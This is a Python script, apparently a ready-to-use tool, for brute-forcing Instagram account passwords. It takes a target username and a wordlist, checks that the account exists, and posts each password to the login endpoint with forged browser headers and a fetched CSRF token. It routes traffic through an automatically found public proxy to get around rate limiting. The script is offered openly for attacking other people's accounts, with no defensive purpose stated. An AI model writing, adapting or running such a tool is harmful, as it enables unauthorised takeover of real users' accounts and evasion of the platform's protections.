import argparse
import requests
import os
import codecs

import socket
import socks

import asyncio
from proxybroker import Broker

#args parser
parser = argparse.ArgumentParser()
parser.add_argument('username', help='Instagram username of the user you want to attack')
parser.add_argument('passwords_file', help='A passwords file for the software')
args = parser.parse_args()
if not os.path.exists(args.passwords_file):
	exit('[*] Sorry, can\'t find file named "%s"' % args.passwords_file)

#help functions
#remove empty lines and duplicates 
def cleanList(items):
	newList = []
	for x in items:
		if not (x == None or x == ''):
			if not x in newList:
				newList.append(x)
	return newList

#main class - Instagram bruteforce
class Instabrute():
	def __init__(self, username, passwords):
		self.username = username
		if not self.userExists():
			exit('[*] Can\'t find user named "%s"' % self.username)

		self.passwords = passwords

		self.attempts = 0 

	def userExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
		if r.status_code == 404:
			return False
		elif r.status_code == 200:
			return True
		else:
			return False

	def _next(self):
		#add 1 attempt to the counter
		self.attempts += 1
		#remove the first password (the current)
		self.passwords.pop(0)
		#try the next password
		self.login()

	def login(self):
		sess = requests.Session()

		#requests headers and cookies
		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
			'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36',
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		#update csrf token for the first time
		sess.headers.update({'X-CSRFToken' : sess.get('https://www.instagram.com/').cookies.get_dict()['csrftoken']})

		#try to login
		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={
			'username':self.username, 
			'password':self.passwords[0]
		}, allow_redirects=True)

		if 'authenticated' in r.text:
			if r.json()['authenticated']:
				exit('[%s] Yay, the password is "%s"' % (str(self.attempts+1), self.passwords[0]))
				#update csrf token after login try (if you want to keep the session)
				#sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
			else:
				print ('[%s] Can\'t login with "%s"' % (str(self.attempts+1), self.passwords[0]))
				#try the next password
				self._next()
		else:
			if 'message' in r.text:
				if r.json()['message'] == 'Please wait a few minutes before you try again.':
					pass #Do you want to wait or use proxy?
				elif r.json()['message'] == 'checkpoint_required':
					exit('[%s] Yay, the password is "%s"' % (str(self.attempts+1), self.passwords[0]))
				else:
					print ('[MESSAGE] %s' % r.json()['message'])
			else:
				print (r.text)

#find proxy
async def proxything(proxies):
	while True:
		proxy = await proxies.get()
		if proxy is None: break
		print('[*] Found proxy: %s' % proxy)
		socks.set_default_proxy(socks.HTTP, proxy.host, proxy.port)
		socket.socket = socks.socksocket
proxies = asyncio.Queue()
asyncio.get_event_loop().run_until_complete(asyncio.gather(Broker(proxies).find(types=['HTTPS', 'HTTP'], limit=1), proxything(proxies)))

#main action
with codecs.open(args.passwords_file, 'r', 'utf-8') as file:
	passwords = file.read().splitlines()
	if len(passwords) < 1:
		exit('[*] The file is empty')
	else:
		passwords = cleanList(passwords)
		print ('[*] %s passwords loaded successfully' % len(passwords))

bruteforce = Instabrute(args.username, passwords)
bruteforce.login()
